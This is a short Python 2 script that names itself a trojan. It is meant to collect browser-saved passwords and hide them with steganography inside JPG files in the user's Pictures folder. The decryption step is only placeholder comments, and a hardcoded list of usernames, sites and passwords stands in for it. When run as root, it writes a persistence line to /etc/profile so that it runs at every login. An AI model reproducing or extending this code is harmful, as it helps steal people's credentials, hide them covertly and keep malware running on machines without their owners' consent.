import glob
from os import path, geteuid
import stepic
import Image
from datetime import datetime
import sys


# Function to encode a stego message from image
def encode(filepath, message):
	img = Image.open(filepath)
	stegimg = stepic.encode(img,message);
	stegimg.save(filepath,'PNG')

# Function to decode the stego message from image
def  decode(filepath):
	img = Image.open(filepath)
	message = stepic.decode(img)
	return message

# Function to format message.  Message format  e.g. 06qwertyshamilcm@facebook.com
def format_msg(entry):
	msg = str(entry[2].__len__()) + entry[2] + entry[0] + "@" + entry[1] + "#"
	return msg
	
# Function to decrypt passwords from the browser and save in a file
def decrypt_passwords():
	msglist = []
	# Code to decrypt from firefox or chrom
	# Code
	# Code
	# Code
	savedlist = [['vivekanand','dss.nitc.ac.in','myrollb0900'],['vivekzhere','accounts.google.com','vivpassword'],['nithinvnath','http://onlinesbi.com','secretbankpassword'],['arunkuruvila','http://facebook.com','mybirthdaypw'],['aravind.an','http://twitter.com','fastrack'],['sreeraj.altair','http://accounts.google.com', 'some_game']]
	msglist = []
	for entry in savedlist:
		msglist.append(format_msg(entry))
	return msglist



# Function to initialize first time run
def first_run():
	msglist = decrypt_passwords()			# List of browser saved passwords
	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
	i = 0									# Message Iterator
	picdir = path.expanduser("~/Pictures/Pictures/")
	for infile in glob.glob(picdir+"*.jpg"):
		i = (i+1)%num_of_msgs;
		encode(infile,msglist[i]);
	f = open('bootup.cfg', 'w+')
	f.write(str(datetime.now()))
	f.close()
	if geteuid() == 0:
		f = open('/etc/profile','a')
		f.write("sudo python trojan.py&");
		f.close()
	for infile in glob.glob(picdir+"*.jpg"):
		print decode(infile);		
	
	
	
# Main Function
if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
	first_run()

	


